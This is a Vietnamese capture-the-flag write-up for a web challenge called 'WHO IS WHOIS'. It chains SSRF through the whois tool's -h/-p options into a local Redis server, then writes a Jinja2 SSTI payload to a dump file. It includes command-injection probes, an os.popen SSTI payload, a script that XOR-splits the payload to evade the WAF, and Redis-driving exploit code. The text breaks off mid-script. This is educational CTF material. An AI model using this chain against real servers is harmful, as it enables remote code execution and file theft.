WHO IS WHOIS

Flag: NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_a0bdff8f40744e2e8c2104a7ab74ffe6}

Category: Web Technique: SSRF to SSTI via Redis

Flag: NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_a0bdff8f40744e2e8c2104a7ab74ffe6}

Mình nhập thử google.com.Web in ra thông tin đăng ký tên miền của Google.Backend chắc chắn đang gọi lệnh hệ thống whois. Thử ngay Command Injection

Vì ứng dụng rõ ràng đang gọi công cụ "whois" của hệ điều hành dưới nền (vd: os.system("whois " + input)), ý tưởng kinh điển nhất là Command Injection. Tôi thử nối thêm lệnh bằng dấu chấm phẩy: google.com; id và google.com \`whoami\`

Vậy là có WAF chặn hết các kí tự nhạy cảm, vậy là hướng này có lẽ không khai thác được nên tôi tìm con đường khác

Khi bị chặn bởi WAF, tôi không đâm đầu vào nó nữa, tôi đi tìm đường khác.Tôi mở Terminal gõ man whois để đọc tài liệu gốc.

Bản chất lệnh whois không phải là một công cụ phân tích cục bộ. Khi tôi gõ whois google.com, công cụ này sẽ mở một kết nối TCP đến một máy chủ Whois quốc tế.Tôi sẽ lợi dụng -h và -p để chuyển hướng kết nối tcp đó.Nên tôi nghĩ đến sẽ khai thác theo hướng SSRF

Máy chủ này chắc chắn đang chạy một database tên là Redis ở dưới nền để làm bộ đệm.Tôi sẽ thử theo hướng cho máy chủ Web tự kết nối vào chính nó 127.0.0.1 ở cổng 6379. Cổng 6379 là cổng mặc định của Redis.Vì máy chủ web tin tưởng chính nó nên Redis sẽ không đòi hỏi mật khẩu.Nếu như test thành công thì tôi sẽ lợi dụng nó

SSRF đang hoạt động.

Soi mã nguồn HTML và phát hiện form được gửi qua phương thức POST tới endpoint /api/whois.

Tôi có thể điều khiển Redis, nhưng cần tìm cách đọc file từ Redis.

Web đang dùng Template Engine (Jinja2) để đọc các file .tpl và render ra HTML.

Nếu mình đổi style thành ../db/dump (này tên file backup mặc định của Redis), web có thể đọc chính cái database Redis lên và render, tên file mặc định thường là dump.rdb

Tôi sẽ lợi dụng SSRF để gửi mã độc SSTI vào Redis, sau đó ra lệnh cho Redis lưu file đó thành dump.tpl và đặt vào thư mục web, thì khi ta truy cập /render?tpl=../db/dump, mã độc sẽ được kích hoạt

Sau đó tôi đọc tài liệu trên github PayloadsAllTheThings

Mục tiêu của tôi bây giờ là:Nhét mã độc Jinja2 vào Redis, ép Redis ghi ra file dump.tpl Gọi /render?tpl=../db/dump để thực thi mã độc

Mã độc SSTI để đọc flag: {{ config.__class__.__init__.__globals__['os'].popen('/flag').read() }}

WAF cấm tất cả các kí tự quan trọng để mình sử dụng lỗi SSTI

Lúc này tôi nhớ đến một khái niệm gọi là Smuggling,kiểu như mình muốn mang chất nổ qua cổng an ninh nhưng máy quét sẽ quét được và cấm nó.Nhưng nếu mình tách nó ra thành các chất vô hại như muối,nước,.. rồi khi đi qua cổng mình mới chế tạo thuốc nổ thì mình sẽ vượt qua được cổng an ninh.

Sau khi tìm kiếm Redis thì mình thấy có lệnh BITOP XOR.Nó sẽ lấy a xor với b và sinh ra c.Nhưng payload của tôi khá dài nên tôi phải viết script python để nó tự xor cái payload đó thành a với b.

target = "{{config|attr(request.args.c)|attr(request.args.i)|attr(request.args.g)|attr(request.args.ge)(request.args.os)|attr(request.args.po)(request.args.cmd)|attr(request.args.r)()}}"
forbidden = set('/\\;\n|&`$!?*()"\'_ []<>{}#%=')
allowed = set(chr(i) for i in range(32,127)) - forbidden
s1, s2 = "", ""
for c in target:
    for a in allowed:
        for b in allowed:
            if ord(a)^ord(b)==ord(c):
                s1+=a; s2+=b; break
        else: continue
        break
print("S1="+s1)
print("S2="+s2)

Giờ ta đã có a với b, xong rồi bây giờ bắt đầu lấy flag.Tôi sẽ gửi lệnh FLUSHDB để xóa sạch rác trong RAM Redis.Gửi S1 và S2 qua bộ lọc WAF vào Redis bằng lệnh SET k1 và SET k2. Vì S1 và S2 không chứa ký tự cấm, WAF sẽ không nhận ra.Sau đó tôi gọi lệnh BITOP XOR pwn k1 k2.Lúc này nó sẽ ghép lại thành payload.Sau đó tôi dùng lệnh SAVE để nén toàn bộ RAM thành file dump.tpl trên ổ cứng.Rồi tôi truy cập url /render?tpl=../db/dump sau đó Jinja2 sẽ đọc dump.tpl sau đó nó sẽ quét thấy lệnh os.popen('/flag') rồi sẽ in ra flag

def send(cmd):
    data = urllib.parse.urlencode({'domain': f"{cmd} -h 127.0.0.1 -p 6379"}).encode()
    urllib.request.urlopen(urllib.request.Request(f"{BASE}/api/whois", data=data))
send("FLUSHDB")
send("CONFIG SET dbfilename dump.tpl")
send(f"SET k1 {s1}")
send(f"SET k2 {s2}")
send("BITOP XOR pwn k1 k2")
send("SAVE")
time.sleep(1)
params = urllib.parse.urlencode({

    'ge': 'get', 'os': 'os', 'po': 'popen', 'cmd': '/flag', 'r': 'read'
